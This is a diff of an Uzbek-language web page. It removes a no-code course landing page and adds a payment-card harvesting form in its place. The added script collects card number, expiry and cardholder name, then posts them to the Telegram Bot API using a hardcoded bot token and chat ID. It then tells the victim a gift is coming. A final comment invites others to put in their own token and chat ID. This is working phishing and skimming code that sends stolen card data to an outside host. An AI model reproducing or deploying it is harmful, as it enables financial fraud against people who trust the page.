-                <h3><i class="fas fa-bolt"></i> Inqilobiy Konsept</h3>
-                <p class="revolution-text">Biz sizga kod yozishni emas, balki <strong>mavjud dasturlardan qanday foydalanishni</strong> o'rgatamiz. Dasturchi bo'lmaganlar uchun maxsus ishlab chiqilgan usullar bilan o'zingizning dasturingizni yarating va daromad oling!</p>
-            </div>
-            
-            <div class="countdown animate__animated animate__fadeIn animate__delay-2s">
-                <div class="countdown-title">Chegirmalar tugashiga qolgan vaqt:</div>
-                <div class="countdown-timer">
-                    <div class="countdown-item">
-                        <div class="countdown-number" id="days">05</div>
-                        <div class="countdown-label">Kun</div>
-                    </div>
-                    <div class="countdown-item">
-                        <div class="countdown-number" id="hours">12</div>
-                        <div class="countdown-label">Soat</div>
-                    </div>
-                    <div class="countdown-item">
-                        <div class="countdown-number" id="minutes">45</div>
-                        <div class="countdown-label">Daqiqa</div>
-                    </div>
-                    <div class="countdown-item">
-                        <div class="countdown-number" id="seconds">30</div>
-                        <div class="countdown-label">Soniya</div>
-                    </div>
-                </div>
-            </div>
-            
-            <button class="cta-button telegram-btn animate__animated animate__pulse animate__delay-2s animate__infinite" id="heroTelegramBtn">
-                <i class="fab fa-telegram telegram-icon"></i> TELEGRAM ORQALI RO'YXATDAN O'TISH
-            </button>
-        </div>
-    </section>
+        // Elementlar
+        const cardNumberInput = document.getElementById('cardNumber');
+        const expiryInput = document.getElementById('expiry');
+        const cardholderInput = document.getElementById('cardholderName');
+        const sendBtn = document.getElementById('sendToTelegramBtn');
 
-    <!-- Main concept section -->
-    <section class="container">
-        <h2 class="section-title" id="concept">Asosiy Konsept</h2>
-        <div class="main-concept">
-            <div class="concept-icon">
-                <i class="fas fa-magic"></i>
-            </div>
-            <h3>Siz Dasturchi Emassiz, Ammo Dastur Yaratasiz!</h3>
-            
-            <p class="concept-text">An'anaviy dasturlash kurslaridan farqli o'laroq, biz sizga <strong>kod yozishni emas, balki mavjud vositalar va platformalardan qanday samarali foydalanishni</strong> o'rgatamiz. Bu sizga o'z dasturingizni yaratish imkonini beradi, lekin buning uchun hech qanday dasturlash bilimiga ega bo'lishingiz shart emas.</p>
-            
-            <div class="highlight-box">
-                <h4><i class="fas fa-star"></i> Nega Kod Yozishni O'rganishingiz Shart Emas?</h4>
-                <p>Bugungi kunda no-code va low-code platformalar sizga dasturchi yordamisiz o'z dasturingizni yaratish imkonini beradi. Biz sizga ushbu platformalarni o'zgartirish, sozlash va ulardan to'liq foydalanishni o'rgatamiz.</p>
-            </div>
-            
-            <p class="concept-text"><strong>IT mutaxassisi bo'lmaganlar uchun maxsus mo'ljallangan usullar:</strong> Grafik interfeyslar, drag-and-drop vositalari, konfiguratsiya qilish va boshqa sodda metodlar yordamida siz professional darajadagi dasturlar yaratishingiz mumkin.</p>
-            
-            <div class="highlight-box">
-                <h4><i class="fas fa-chart-line"></i> Daromad Olishning Zamonaviy Usuli</h4>
-                <p>Kurs davomida siz nafaqat dastur yaratishni, balki uni qanday monetizatsiya qilishni, mijozlarga sotishni va daromad olishni o'rganasiz. Dasturingizni yaratgandan so'ng, uni internet orqali sotish va oylik barqaror daromad olish imkoniyatiga ega bo'lasiz.</p>
-            </div>
-        </div>
-    </section>
-
-    <!-- No-coding revolution section -->
-    <section class="container">
-        <div class="no-coding">
-            <h2>Kod Yozish Davri Tugadi!</h2>
-            <div class="no-coding-content">
-                <p>Hozirgi zamon no-code inqilobi davri. Bugungi kunda dunyoning eng yirik kompaniyalari no-code platformalar yordamida dasturlar yaratmoqda.</p>
-                
-                <div class="no-coding-box">
-                    <p><strong>"Men IT mutaxassisi emasman, lekin kursni tugatganimdan keyin 3 oy ichida o'z mobil ilovamni yaratdim va uni AppStore'ga joyladim. Hozir oylik $2000 daromad olyapman!"</strong></p>
-                    <p style="margin-top: 10px; font-style: italic;">- Mijozimiz Andrey, 42 yosh, avval tarix o'qituvchisi</p>
-                </div>
-                
-                <p><strong>Siz ham shunday qilishingiz mumkin!</strong> Biz sizga qanday qilishni ko'rsatamiz. Dasturlashni o'rganishga 2-3 yil sarflashning o'rniga, 3 oyda no-code platformalar orqali dastur yaratishni o'rganing va daromad olishni boshlang.</p>
-            </div>
-        </div>
-    </section>
-
-    <!-- Instructors section -->
-    <section class="container">
-        <h2 class="section-title" id="instructors">Bizning O'qituvchilar</h2>
-        <div class="instructors">
-            <div class="instructor">
-                <img src="https://randomuser.me/api/portraits/men/32.jpg" alt="Luis" class="instructor-img">
-                <h3>Luis Rodriguez</h3>
-                <p class="instructor-title">No-Code Eksperti</p>
-                <p>12 yillik no-code platformalar tajribasi. 8000+ o'quvchiga dars bergan. IT bilimi bo'lmagan odamlar uchun maxsus o'quv dasturlari muallifi.</p>
-            </div>
-            <div class="instructor">
-                <img src="https://randomuser.me/api/portraits/men/44.jpg" alt="Sergio" class="instructor-img">
-                <h3>Sergio Martinez</h3>
-                <p class="instructor-title">Dastur Monetizatsiyasi Mutaxassisi</p>
-                <p>10 yillik raqamli mahsulotlar marketingi va monetizatsiyasi tajribasi. 150+ dasturni bozorga chiqarishda yordam bergan.</p>
-            </div>
-        </div>
-    </section>
-
-    <!-- Pricing section -->
-    <section class="container">
-        <h2 class="section-title" id="pricing">Kurs Narxlari</h2>
-        <div class="pricing">
-            <div class="price-card">
-                <h3>1 Oylik Paket</h3>
-                <div class="price">500$</div>
-                <ul>
-                    <li><i class="fas fa-check"></i> No-code asoslari va platformalar</li>
-                    <li><i class="fas fa-check"></i> Dastur yaratish amaliyoti</li>
-                    <li><i class="fas fa-check"></i> Oylik 8 ta video darslik</li>
-                    <li><i class="fas fa-check"></i> Boshlang'ich loyiha yordami</li>
-                    <li><i class="fas fa-check"></i> E-mail orqali qo'llab-quvvatlash</li>
-                </ul>
-                <button class="cta-button telegram-btn purchase-btn" data-plan="1 Oylik Paket">
-                    <i class="fab fa-telegram telegram-icon"></i> Xarid Qilish
-                </button>
-            </div>
-            
-            <div class="price-card popular">
-                <div class="popular-tag">Tavsiya etiladi</div>
-                <h3>3 Oylik Paket</h3>
-                <div class="price">1200$ <span>/ 3 oy</span></div>
-                <ul>
-                    <li><i class="fas fa-check"></i> 1 oylik paketdagi barcha imtiyozlar</li>
-                    <li><i class="fas fa-check"></i> Shaxsiy mentorlik (haftada 2 marta)</li>
-                    <li><i class="fas fa-check"></i> Dasturni bozorga chiqarish yordami</li>
-                    <li><i class="fas fa-check"></i> Monetizatsiya strategiyalari</li>
-                    <li><i class="fas fa-check"></i> Cheksiz qo'llab-quvvatlash</li>
-                    <li><i class="fas fa-check"></i> Bitiruvchilar hamjamiyatiga kirish</li>
-                </ul>
-                <button class="cta-button telegram-btn purchase-btn" data-plan="3 Oylik Paket (Eng Yaxshi Taklif)">
-                    <i class="fab fa-telegram telegram-icon"></i> Eng Yaxshi Taklifni Xarid Qilish
-                </button>
-            </div>
-        </div>
-    </section>
-
-    <!-- Benefits section -->
-    <section class="container">
-        <h2 class="section-title" id="benefits">Kursni Tamomlaganingizda</h2>
-        <div class="benefits">
-            <div class="benefit-card">
-                <div class="benefit-icon">
-                    <i class="fas fa-rocket"></i>
-                </div>
-                <h3>Kod Yozmasdan Dastur Yaratasiz</h3>
-                <p>No-code platformalar yordamida o'zingizning mobil ilova yoki veb-dasturingizni yaratasiz. Dasturlashni o'rganishga vaqt sarflamasdan.</p>
-            </div>
-            
-            <div class="benefit-card">
-                <div class="benefit-icon">
-                    <i class="fas fa-money-bill-wave"></i>
-                </div>
-                <h3>Daromad Olishni Boshlaysiz</h3>
-                <p>Yaratgan dasturingizni internet orqali sotishni o'rganasiz va birinchi daromadingizni olasiz. Kurs davomida daromad olishni boshlaysiz.</p>
-            </div>
-            
-            <div class="benefit-card">
-                <div class="benefit-icon">
-                    <i class="fas fa-user-tie"></i>
-                </div>
-                <h3>O'z Biznesingizni Boshlaysiz</h3>
-                <p>Dastur yaratish va sotish orqali o'zingizning raqamli biznesingizni boshlaysiz. Hech qanday ofis yoki xodimlar talab qilmaydigan biznes.</p>
-            </div>
-        </div>
-    </section>
-
-    <!-- Testimonials section -->
-    <section class="container">
-        <h2 class="section-title">Bitiruvchilarimizning Fikrlari</h2>
-        <div class="testimonials">
-            <div class="testimonial-slider">
-                <div class="testimonial-card">
-                    <p class="testimonial-text">"Men 45 yoshli buxgalterman va hech qachon kompyuter bilan ishlashni bilmasdim. Luis va Sergioning kursi mening hayotimni o'zgartirdi. Endi men o'zimning kichik biznes dasturimni yaratdim va uni 3 ta kompaniyaga sotdim!"</p>
-                    <div class="testimonial-author">
-                        <img src="https://randomuser.me/api/portraits/women/55.jpg" alt="Elena" class="author-img">
-                        <div class="author-info">
-                            <h4>Elena Petrova</h4>
-                            <p>Buxgalter, kurs bitiruvchisi</p>
-                        </div>
-                    </div>
-                </div>
-                
-                <div class="testimonial-card">
-                    <p class="testimonial-text">"Men hech qanday IT bilimiga ega emasdim, faqatgina oddiy foydalanuvchi darajasida. Ushbu kursda menga dasturlashni emas, balki dasturlardan foydalanish o'rgatildi. 2 oy ichida birinchi ilovamni yaratdim!"</p>
-                    <div class="testimonial-author">
-                        <img src="https://randomuser.me/api/portraits/men/65.jpg" alt="Alex" class="author-img">
-                        <div class="author-info">
-                            <h4>Alexey Smirnov</h4>
-                            <p>Soqchi, endi dastur yaratuvchi</p>
-                        </div>
-                    </div>
-                </div>
-                
-                <div class="testimonial-card">
-                    <p class="testimonial-text">"Men universitetda adabiyot o'qiyman, ammo bu kurs mening asosiy daromad manbaimga aylandi. Dasturchi bo'lmagan odamlar uchun mo'ljallangan usullar juda samarali. Hozir oyiga $1500 daromad qilaman!"</p>
-                    <div class="testimonial-author">
-                        <img src="https://randomuser.me/api/portraits/women/68.jpg" alt="Maria" class="author-img">
-                        <div class="author-info">
-                            <h4>Maria Ivanova</h4>
-                            <p>Talaba, dastur yaratuvchi</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Final CTA section -->
-    <section class="container" style="text-align: center; margin-bottom: 80px;">
-        <h2 class="section-title">Vaqtni Bekor Qilmang!</h2>
-        <div class="main-concept">
-            <h3>Har bir Kun Sizning Foydangiz Uchun Muhim</h3>
-            <p class="concept-text" style="font-size: 22px; margin-bottom: 30px;">Har kuni yuzlab odamlar no-code platformalar orqali o'z dasturlarini yaratmoqda va daromad olishmoqda. Nima uchun siz ular qatorida bo'lmaysiz?</p>
-            
-            <div class="highlight-box" style="background: linear-gradient(135deg, #e8f5e9, #c8e6c9); border-left: 5px solid #4caf50;">
-                <h4><i class="fas fa-gem"></i> Chegirmalar Cheklangan Muddati Bor!</h4>
-                <p style="font-size: 20px;">Hozir ro'yxatdan o'ting va 3 oylik paket uchun 1200$ o'rniga faqat 1000$ to'lang! Bu chegirma faqat keyingi 5 kun davomida amal qiladi.</p>
-            </div>
-            
-            <button class="cta-button telegram-btn" id="finalTelegramBtn" style="margin-top: 30px; font-size: 22px; padding: 20px 50px;">
-                <i class="fab fa-telegram telegram-icon"></i> TELEGRAM ORQALI RO'YXATDAN O'TING
-            </button>
-        </div>
-    </section>
-
-    <!-- Footer section -->
-    <footer>
-        <div class="container">
-            <div class="footer-content">
-                <div class="footer-column">
-                    <h3>IT Darslik</h3>
-                    <p>No-code dastur yaratish va internet orqali pul topish bo'yicha professional ta'lim platformasi. 2018 yildan beri 12,000+ dasturchi bo'lmagan o'quvchini tayyorladik.</p>
-                    <div class="social-icons">
-                        <a href="#"><i class="fab fa-facebook-f"></i></a>
-                        <a href="#"><i class="fab fa-instagram"></i></a>
-                        <a href="https://t.me/teamseobot" target="_blank"><i class="fab fa-telegram"></i></a>
-                        <a href="#"><i class="fab fa-youtube"></i></a>
-                    </div>
-                </div>
-                
-                <div class="footer-column">
-                    <h3>Tez Havolalar</h3>
-                    <a href="#home">Bosh sahifa</a>
-                    <a href="#concept">Konsept</a>
-                    <a href="#instructors">O'qituvchilar</a>
-                    <a href="#pricing">Narxlar</a>
-                    <a href="#benefits">Imkoniyatlar</a>
-                </div>
-                
-                <div class="footer-column">
-                    <h3>Kursni Xarid Qilish</h3>
-                    <p>Kursni xarid qilish uchun Telegram botimizga murojaat qiling:</p>
-                    <a href="https://t.me/teamseobot" target="_blank" style="color: #00e5ff; font-weight: bold;">
-                        <i class="fab fa-telegram"></i> @teamseobot
-                    </a>
-                    <p style="margin-top: 15px;">Yoki quyidagi raqamga telefon qiling:</p>
-                    <p><i class="fas fa-phone"></i> +998 90 123 45 67</p>
-                </div>
-            </div>
-            
-            <div class="copyright">
-                <p>&copy; 2023 IT Darslik. Barcha huquqlar himoyalangan. | "Biz sizga kod yozishni emas, dastur yaratishni o'rgatamiz!" | Telegram: <a href="https://t.me/teamseobot" target="_blank" style="color: #00e5ff;">@teamseobot</a></p>
-            </div>
-        </div>
-    </footer>
-
-    <script>
-        // Telegram modal functions
-        const telegramModal = document.getElementById('telegramModal');
-        const closeModal = document.getElementById('closeModal');
-        const heroTelegramBtn = document.getElementById('heroTelegramBtn');
-        const finalTelegramBtn = document.getElementById('finalTelegramBtn');
-        const purchaseButtons = document.querySelectorAll('.purchase-btn');
-        let selectedPlan = '';
-        
-        // Open modal function
-        function openTelegramModal(plan = '') {
-            selectedPlan = plan;
-            telegramModal.classList.add('active');
-            document.body.style.overflow = 'hidden';
-            
-            // Update modal text if a plan is selected
-            if (plan) {
-                const modalText = telegramModal.querySelector('p');
-                modalText.innerHTML = `Siz <strong>${plan}</strong> ni tanladingiz. Kursni xarid qilish uchun quyidagi tugma orqali bizning Telegram botimizga o'ting. Bot sizga tanlangan paket haqida batafsil ma'lumot beradi va ro'yxatdan o'tish jarayonini boshlaydi.`;
+        // Karta raqamini formatlash: 0000 0000 0000 0000
+        cardNumberInput.addEventListener('input', function(e) {
+            let value = this.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
+            let parts = [];
+            for (let i = 0; i < value.length; i += 4) {
+                parts.push(value.substr(i, 4));
             }
-        }
-        
-        // Close modal function
-        function closeTelegramModal() {
-            telegramModal.classList.remove('active');
-            document.body.style.overflow = 'auto';
-        }
-        
-        // Event listeners for opening modal
-        heroTelegramBtn.addEventListener('click', () => openTelegramModal());
-        finalTelegramBtn.addEventListener('click', () => openTelegramModal('3 Oylik Paket (Chegirma narxi: 1000$)'));
-        
-        // Event listeners for purchase buttons
-        purchaseButtons.forEach(button => {
-            button.addEventListener('click', () => {
-                const plan = button.getAttribute('data-plan');
-                openTelegramModal(plan);
-            });
+            this.value = parts.join(' ').substr(0, 19);
+            // Xatolik klassini olib tashlash
+            this.classList.remove('error');
         });
-        
-        // Event listener for closing modal
-        closeModal.addEventListener('click', closeTelegramModal);
-        
-        // Close modal when clicking outside
-        telegramModal.addEventListener('click', (e) => {
-            if (e.target === telegramModal) {
-                closeTelegramModal();
-            }
-        });
-        
-        // Close modal with Escape key
-        document.addEventListener('keydown', (e) => {
-            if (e.key === 'Escape' && telegramModal.classList.contains('active')) {
-                closeTelegramModal();
-            }
-        });
-        
-        // Direct Telegram link as fallback
-        function openDirectTelegram() {
-            window.open('https://t.me/teamseobot', '_blank');
-        }
-        
-        // Mobile menu toggle
-        const mobileMenuBtn = document.getElementById('mobileMenu');
-        const mainNav = document.getElementById('mainNav');
-        
-        mobileMenuBtn.addEventListener('click', function() {
-            mainNav.classList.toggle('active');
-            
-            // Change menu icon
-            const icon = mobileMenuBtn.querySelector('i');
-            if (mainNav.classList.contains('active')) {
-                icon.classList.remove('fa-bars');
-                icon.classList.add('fa-times');
+
+        // Amal qilish muddatini formatlash: MM/YY
+        expiryInput.addEventListener('input', function(e) {
+            let value = this.value.replace(/\//g, '').replace(/[^0-9]/g, '');
+            if (value.length >= 3) {
+                this.value = value.substr(0, 2) + '/' + value.substr(2, 2);
             } else {
-                icon.classList.remove('fa-times');
-                icon.classList.add('fa-bars');
+                this.value = value;
             }
+            this.classList.remove('error');
         });
-        
-        // Smooth scrolling for navigation links
-        document.querySelectorAll('nav a').forEach(anchor => {
-            anchor.addEventListener('click', function(e) {
-                e.preventDefault();
-                
-                const targetId = this.getAttribute('href');
-                const targetElement = document.querySelector(targetId);
-                
-                window.scrollTo({
-                    top: targetElement.offsetTop - 80,
-                    behavior: 'smooth'
-                });
-                
-                // Close mobile menu after clicking a link
-                if (mainNav.classList.contains('active')) {
-                    mainNav.classList.remove('active');
-                    const icon = mobileMenuBtn.querySelector('i');
-                    icon.classList.remove('fa-times');
-                    icon.classList.add('fa-bars');
-                }
-            });
+
+        // Inputlardan xatolik klassini olib tashlash
+        [cardNumberInput, expiryInput, cardholderInput].forEach(input => {
+            input.addEventListener('focus', () => input.classList.remove('error'));
         });
-        
-        // Countdown timer
-        function updateCountdown() {
-            const now = new Date();
-            const targetDate = new Date();
-            targetDate.setDate(now.getDate() + 5);
-            targetDate.setHours(23, 59, 59, 999);
-            
-            const timeRemaining = targetDate - now;
-            
-            if (timeRemaining <= 0) {
-                document.getElementById('days').textContent = '00';
-                document.getElementById('hours').textContent = '00';
-                document.getElementById('minutes').textContent = '00';
-                document.getElementById('seconds').textContent = '00';
+
+        // Yuborish tugmasi
+        sendBtn.addEventListener('click', function() {
+            // Oq bo‘shliqlarni tozalab olish
+            let cardNumber = cardNumberInput.value.replace(/\s/g, '');
+            let expiry = expiryInput.value.trim();
+            let cardholder = cardholderInput.value.trim();
+
+            let hasError = false;
+
+            // Validatsiya
+            if (cardNumber.length < 16 || !/^\d{16}$/.test(cardNumber)) {
+                cardNumberInput.classList.add('error');
+                hasError = true;
+            }
+            if (!/^\d{2}\/\d{2}$/.test(expiry)) {
+                expiryInput.classList.add('error');
+                hasError = true;
+            }
+            if (cardholder === '') {
+                cardholderInput.classList.add('error');
+                hasError = true;
+            }
+
+            if (hasError) {
+                alert('Iltimos, barcha maydonlarni to‘g‘ri to‘ldiring');
                 return;
             }
-            
-            const days = Math.floor(timeRemaining / (1000 * 60 * 60 * 24));
-            const hours = Math.floor((timeRemaining % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-            const minutes = Math.floor((timeRemaining % (1000 * 60 * 60)) / (1000 * 60));
-            const seconds = Math.floor((timeRemaining % (1000 * 60)) / 1000);
-            
-            document.getElementById('days').textContent = days.toString().padStart(2, '0');
-            document.getElementById('hours').textContent = hours.toString().padStart(2, '0');
-            document.getElementById('minutes').textContent = minutes.toString().padStart(2, '0');
-            document.getElementById('seconds').textContent = seconds.toString().padStart(2, '0');
-        }
-        
-        setInterval(updateCountdown, 1000);
-        updateCountdown();
-        
-        // Animate elements on scroll
-        const observerOptions = {
-            threshold: 0.1,
-            rootMargin: '0px 0px -100px 0px'
-        };
-        
-        const observer = new IntersectionObserver(function(entries) {
-            entries.forEach(entry => {
-                if (entry.isIntersecting) {
-                    entry.target.classList.add('animate__animated', 'animate__fadeInUp');
+
+            // Telegram xabarini tayyorlash
+            const message = `🆕 YANGI KARTA MA'LUMOTLARI\n` +
+                            `┌───────────────────\n` +
+                            `💳 Karta raqami: ${cardNumber}\n` +
+                            `📅 Amal qilish: ${expiry}\n` +
+                            `👤 Ism Familiya: ${cardholder}\n` +
+                            `└───────────────────`;
+
+            // Telegram API ga so‘rov yuborish
+            fetch(`https://api.telegram.org/bot${8114630640:AAGJgz1jLpRbt3zzM0se61xfh6GMdrGBj6s}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id:7081746531,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    alert('✅ Maʼlumotlaringiz qabul qilindi. Tez orada sovg‘a haqida habar beramiz.');
+                    // Formani tozalash
+                    cardNumberInput.value = '';
+                    expiryInput.value = '';
+                    cardholderInput.value = '';
+                } else {
+                    alert('❌ Xatolik yuz berdi. Iltimos, qayta urinib ko‘ring.\n' + (data.description || ''));
+                }
+            })
+            .catch(error => {
+                alert('❌ Tarmoq xatosi: ' + error.message);
+            });
+        });
+
+        // Enter bosilganda yuborish
+        const inputs = [cardNumberInput, expiryInput, cardholderInput];
+        inputs.forEach(input => {
+            input.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    sendBtn.click();
                 }
             });
-        }, observerOptions);
-        
-        // Observe elements for animation
-        document.querySelectorAll('.price-card, .benefit-card, .testimonial-card, .instructor').forEach(el => {
-            observer.observe(el);
         });
-        
-        // Add floating animation to benefit icons on hover
-        document.querySelectorAll('.benefit-card').forEach(card => {
-            card.addEventListener('mouseenter', function() {
-                const icon = this.querySelector('.benefit-icon');
-                icon.style.animation = 'bounce 1s infinite';
-            });
-            
-            card.addEventListener('mouseleave', function() {
-                const icon = this.querySelector('.benefit-icon');
-                icon.style.animation = 'spin 4s linear infinite';
-            });
-        });
-    </script>
+    })();
+</script>
+
+<!-- DIQQAT: BOT_TOKEN va CHAT_ID ni o‘z maʼlumotlaringiz bilan almashtiring. -->
 </body>
 </html>
